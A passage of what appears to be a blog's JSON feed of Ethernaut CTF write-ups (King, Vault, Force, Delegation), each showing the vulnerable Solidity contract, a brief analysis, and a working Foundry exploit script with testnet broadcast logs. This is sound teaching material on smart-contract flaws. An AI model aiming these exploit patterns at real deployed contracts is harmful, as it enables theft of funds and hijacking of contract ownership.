^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.== Logs ==  Befor king:  0xDed9f3474fe5f075Ed7953f36a493928b1BD9f31  After king:  0x18170C5Ed18ceE0a24a327841eFfa6eB745A050a## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001002373 gweiEstimated total gas used for script: 134730Estimated amount required: 0.00000013504971429 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xa7cae242656175eed004f4d74d52f36a11124dba4b5026ae6d20cc29bee65ac9Contract Address: 0x18170C5Ed18ceE0a24a327841eFfa6eB745A050aBlock: 3687281Paid: 0.000000103884106235 ETH (103639 gas * 0.001002365 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000103884106235 ETH (103639 gas * avg 0.001002365 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goals are</p><ol>  <li>reclaim kingship</li>  <li>avoid a self proclamation.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">King</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"n\">king</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">prize</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">king</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">prize</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;=</span> <span class=\"n\">prize</span> <span class=\"o\">||</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">);</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">king</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">);</span>        <span class=\"n\">king</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">prize</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">_king</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">king</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/King.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">King</span> <span class=\"n\">king_</span><span class=\"p\">)</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">king_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">prize</span><span class=\"p\">()}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">KingSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">King</span> <span class=\"k\">public</span> <span class=\"n\">king_</span> <span class=\"o\">=</span> <span class=\"n\">King</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x4Ee0991775535F17Dd47879adA5c2fca799bCA0e</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Befor king: \"</span><span class=\"p\">,</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">_king</span><span class=\"p\">());</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">prize</span><span class=\"p\">()}(</span><span class=\"n\">king_</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After king: \"</span><span class=\"p\">,</span> <span class=\"n\">king_</span><span class=\"p\">.</span><span class=\"n\">_king</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/King.sol <span class=\"nt\">--tc</span> KingSol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†î] Solc 0.8.29 finished <span class=\"k\">in </span>278.71msCompiler run successful with warnings:Warning <span class=\"o\">(</span>9302<span class=\"o\">)</span>: Return value of low-level calls not used.  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> script/King.sol:10:9:   |10 |         address<span class=\"o\">(</span>king_<span class=\"o\">)</span>.call<span class=\"o\">{</span>value: king_.prize<span class=\"o\">()}(</span><span class=\"s2\">\"\"</span><span class=\"o\">)</span><span class=\"p\">;</span>   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Befor king:  0xDed9f3474fe5f075Ed7953f36a493928b1BD9f31  After king:  0x18170C5Ed18ceE0a24a327841eFfa6eB745A050a<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001002373 gweiEstimated total gas used <span class=\"k\">for </span>script: 134730Estimated amount required: 0.00000013504971429 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xa7cae242656175eed004f4d74d52f36a11124dba4b5026ae6d20cc29bee65ac9Contract Address: 0x18170C5Ed18ceE0a24a327841eFfa6eB745A050aBlock: 3687281Paid: 0.000000103884106235 ETH <span class=\"o\">(</span>103639 gas <span class=\"k\">*</span> 0.001002365 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000103884106235 ETH (103639 gas * avg 0.001002365 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-20-King/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/20/king",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-20T00:00:00+09:00",
            "date_modified": "2025-04-20T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/19/vault",
            "title": "[Ethernaut] 08.Vault",
            "summary": null,
            "content_text": "AnalysisThe goal is  Unlock the vault// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault {    bool public locked;    bytes32 private password;    constructor(bytes32 _password) {        locked = true;        password = _password;    }    function unlock(bytes32 _password) public {        if (password == _password) {            locked = false;        }    }}Because the blockchain is transparent, secret keys cannot be stored on it.Exploit$ cast storage 0x65E998C6f70c90f149553c967BA4a38Ecc6213A9 10x412076657279207374726f6e67207365637265742070617373776f7264203a29// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Vault.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract ValutSol is Script {    Vault public vault_ = Vault(0x65E998C6f70c90f149553c967BA4a38Ecc6213A9);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        vault_.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);        vm.stopBroadcast();    }}$ forge script script/VaultSol.sol --broadcast[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†í] Solc 0.8.29 finished in 322.36msCompiler run successful!Script ran successfully.## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.00101144 gweiEstimated total gas used for script: 36108Estimated amount required: 0.00000003652107552 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x14d0aaca36fb737a61c0a533652da5a4d2314117698a64a1788ec28633d7f1b1Block: 3685538Paid: 0.000000026441866776 ETH (26143 gas * 0.001011432 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000026441866776 ETH (26143 gas * avg 0.001011432 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Unlock the vault</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Vault</span> <span class=\"p\">{</span>    <span class=\"kt\">bool</span> <span class=\"k\">public</span> <span class=\"n\">locked</span><span class=\"p\">;</span>    <span class=\"kt\">bytes32</span> <span class=\"k\">private</span> <span class=\"n\">password</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">true</span><span class=\"p\">;</span>        <span class=\"n\">password</span> <span class=\"o\">=</span> <span class=\"n\">_password</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">password</span> <span class=\"o\">==</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Because the blockchain is transparent, secret keys cannot be stored on it.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>cast storage 0x65E998C6f70c90f149553c967BA4a38Ecc6213A9 10x412076657279207374726f6e67207365637265742070617373776f7264203a29</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/cyberchef.png\" alt=\"Image cyberchef\" /></p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Vault.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">ValutSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Vault</span> <span class=\"k\">public</span> <span class=\"n\">vault_</span> <span class=\"o\">=</span> <span class=\"n\">Vault</span><span class=\"p\">(</span><span class=\"mh\">0x65E998C6f70c90f149553c967BA4a38Ecc6213A9</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">vault_</span><span class=\"p\">.</span><span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"mh\">0x412076657279207374726f6e67207365637265742070617373776f7264203a29</span><span class=\"p\">);</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/VaultSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†í] Solc 0.8.29 finished <span class=\"k\">in </span>322.36msCompiler run successful!Script ran successfully.<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.00101144 gweiEstimated total gas used <span class=\"k\">for </span>script: 36108Estimated amount required: 0.00000003652107552 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x14d0aaca36fb737a61c0a533652da5a4d2314117698a64a1788ec28633d7f1b1Block: 3685538Paid: 0.000000026441866776 ETH <span class=\"o\">(</span>26143 gas <span class=\"k\">*</span> 0.001011432 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000026441866776 ETH (26143 gas * avg 0.001011432 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/locked.png\" alt=\"Image locked\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/vault",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/19/force",
            "title": "[Ethernaut] 07.Force",
            "summary": null,
            "content_text": "AnalysisThe goal is  make the balance of the contract greater than zero// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force { /*                   MEOW ?         /\\_/\\   /    ____/ o o \\    /~____  =√∏= /    (______)__m_m)                   */ }Solidity 0.8.30 Documentation - sending and receiving ether  üí° Neither contracts nor ‚Äúexternal accounts‚Äù are currently able to prevent someone from sending them Ether. Contracts can react on and reject a regular transfer, but there are ways to move Ether without creating a message call. One way is to simply ‚Äúmine to‚Äù the contract address and the second way is using¬†selfdestruct(x).Solidity 0.8.30 Documentation - deactivate and self destructThe selfdestruct() function removes code from blockchain.It move Ether stored in the contract to a specified address without creating a message call.Even if a contract‚Äôs code does not contain a call to selfdestruct, it can still perform that operation using delegatecall or callcode.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Force.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(address payable force_) payable {        selfdestruct(force_);    }}contract ForceSol is Script {    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        new Ex{value: 1 wei}(payable(0xD38Cdc747b3Fdc5B553ec592a89b92db3015c2e6));        vm.stopBroadcast();    }}$ forge script script/ForceSol.sol --broadcast --tc ForceSol[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001062799 gweiEstimated total gas used for script: 83584Estimated amount required: 0.000000088832991616 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xfe8f4a467eb59cc75d1969cbcb0338d23b568d91028e387bba6bcebb5c605526Contract Address: 0xfF2baB3F127feb02B77A4dBd869b25f63d442b79Block: 3677667Paid: 0.000000068333210136 ETH (64296 gas * 0.001062791 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000068333210136 ETH (64296 gas * avg 0.001062791 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>make the balance of the contract greater than zero</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Force</span> <span class=\"p\">{</span> <span class=\"cm\">/*                   MEOW ?         /\\_/\\   /    ____/ o o \\    /~____  =√∏= /    (______)__m_m)                   */</span> <span class=\"p\">}</span></code></pre></div></div><p><a href=\"https://docs.soliditylang.org/en/latest/security-considerations.html#sending-and-receiving-ether\">Solidity 0.8.30 Documentation - sending and receiving ether</a></p><blockquote>  <p>üí° Neither contracts nor ‚Äúexternal accounts‚Äù are currently able to prevent someone from sending them Ether. Contracts can react on and reject a regular transfer, but there are ways to move Ether without creating a message call. One way is to simply ‚Äúmine to‚Äù the contract address and the second way is using¬†<code class=\"language-plaintext highlighter-rouge\">selfdestruct(x)</code>.</p></blockquote><p><a href=\"https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#deactivate-and-self-destruct\">Solidity 0.8.30 Documentation - deactivate and self destruct</a></p><p>The <code class=\"language-plaintext highlighter-rouge\">selfdestruct()</code> function removes code from blockchain.</p><p>It move Ether stored in the contract to a specified address without creating a message call.</p><p>Even if a contract‚Äôs code does not contain a call to selfdestruct, it can still perform that operation using delegatecall or callcode.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Force.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">force_</span><span class=\"p\">)</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">selfdestruct</span><span class=\"p\">(</span><span class=\"n\">force_</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">ForceSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0xD38Cdc747b3Fdc5B553ec592a89b92db3015c2e6</span><span class=\"p\">));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/ForceSol.sol <span class=\"nt\">--broadcast</span> <span class=\"nt\">--tc</span> ForceSol<span class=\"o\">[</span>‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001062799 gweiEstimated total gas used <span class=\"k\">for </span>script: 83584Estimated amount required: 0.000000088832991616 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xfe8f4a467eb59cc75d1969cbcb0338d23b568d91028e387bba6bcebb5c605526Contract Address: 0xfF2baB3F127feb02B77A4dBd869b25f63d442b79Block: 3677667Paid: 0.000000068333210136 ETH <span class=\"o\">(</span>64296 gas <span class=\"k\">*</span> 0.001062791 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000068333210136 ETH (64296 gas * avg 0.001062791 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Force/getbalance.png\" alt=\"Image getbalance\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-19-Force/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/force",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","selfdestruct"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/19/delegation",
            "title": "[Ethernaut] 06.Delegation",
            "summary": null,
            "content_text": "AnalysisThe goal is  claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate {    address public owner;    constructor(address _owner) {        owner = _owner;    }    function pwn() public {        owner = msg.sender;    }}contract Delegation {    address public owner;    Delegate delegate;    constructor(address _delegateAddress) {        delegate = Delegate(_delegateAddress);        owner = msg.sender;    }    fallback() external {        (bool result,) = address(delegate).delegatecall(msg.data);        if (result) {            this;        }    }}The fallback() function in the Delegation contract performs delegatecall() to the Delegate contract.The Delegation contract‚Äôs state can be changed by caliing the pwn() function in Delegate contract via delegatecall().msg.sender in the Delegate contract will be EOA because the call is made by using delegatecall().Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Delegation.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract DelegationSol is Script {    Delegation public delegation_ = Delegation(0x604BD638031054664E87618f46871c5423E9cbFF);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        address(delegation_).call(abi.encodeWithSignature(\"pwn()\"));        console.log(\"owner: \", delegation_.owner());        vm.stopBroadcast();    }}$ forge script script/DelegationSol.sol --broadcast[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†î] Solc 0.8.29 finished in 280.67msCompiler run successful with warnings:Warning (9302): Return value of low-level calls not used.  --&gt; script/DelegationSol.sol:14:9:   |14 |         address(delegation_).call(abi.encodeWithSignature(\"pwn()\"));   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.== Logs ==  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001000019 gweiEstimated total gas used for script: 43100Estimated amount required: 0.0000000431008189 ETH==========================##### holesky‚úÖ  [Success] Hash: 0xd749896a13ac87778efd535f37a37c59d6b88fedeb517b326aa83c0af160e8fdBlock: 3677303Paid: 0.000000031204249632 ETH (31204 gas * 0.001000008 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000031204249632 ETH (31204 gas * avg 0.001000008 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Delegate</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">pwn</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Delegation</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"n\">Delegate</span> <span class=\"n\">delegate</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_delegateAddress</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">delegate</span> <span class=\"o\">=</span> <span class=\"n\">Delegate</span><span class=\"p\">(</span><span class=\"n\">_delegateAddress</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">fallback</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">delegate</span><span class=\"p\">).</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">);</span>        <span class=\"k\">if</span> <span 